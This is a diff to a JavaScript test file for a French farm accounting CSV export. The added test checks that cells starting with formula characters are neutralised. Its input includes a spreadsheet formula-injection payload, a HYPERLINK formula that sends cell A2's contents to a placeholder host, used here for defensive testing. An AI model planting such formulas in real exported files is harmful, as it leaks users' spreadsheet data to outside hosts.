@@ -1,7 +1,7 @@
 // n° 96 — export comptable ventilé (logique pure).
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import {accountingRows,accountSummary,operationsCsv,workbookSheets,validatePlan,accountingPlan,stockCategory,DISCLAIMER} from './accounting-export.js';
+import {csvCell,toCsv,accountingRows,accountSummary,operationsCsv,workbookSheets,validatePlan,accountingPlan,stockCategory,DISCLAIMER} from './accounting-export.js';
 
 const farm = (prefs = {}, extra = {}) => ({preferences: prefs, rotations: [], clients: [], contracts: [],
   parcelles: [{id: 'p1', nom: 'Les Noues', culture: 'Blé tendre', surfaceHa: 10}],
@@ -63,4 +63,11 @@ test('CSV au format français et classeur à quatre feuilles avec avertissement'
   const sum = accountSummary(r.rows), f20 = sum.find(g => g.account === '7060' && g.vatRate === 20);
   assert.equal(f20.ht, 500); assert.equal(f20.tva, 100);
   assert.ok(sum.find(g => g.account === '6012').tvaUnknown);
+});
+
+test('CSV : un texte commençant par = + - @ n’est jamais une formule à l’ouverture ; les nombres restent des nombres', () => {
+  assert.equal(csvCell('=HYPERLINK("https://x.example/?"&A2;"Voir")'), `"'=HYPERLINK(""https://x.example/?""&A2;""Voir"")"`);
+  for (const s of ['+33 6', '-x', '@SOMME(A1)', '\tcmd']) assert.ok(csvCell(s).startsWith("'"), s);
+  assert.equal(csvCell(-12.5), '-12,5'); assert.equal(csvCell('GAEC du Bois'), 'GAEC du Bois'); assert.equal(csvCell('Mi-temps'), 'Mi-temps');
+  assert.match(toCsv(['Client', 'TTC'], [['=1+1', -3]]), /'=1\+1;-3$/);
 });
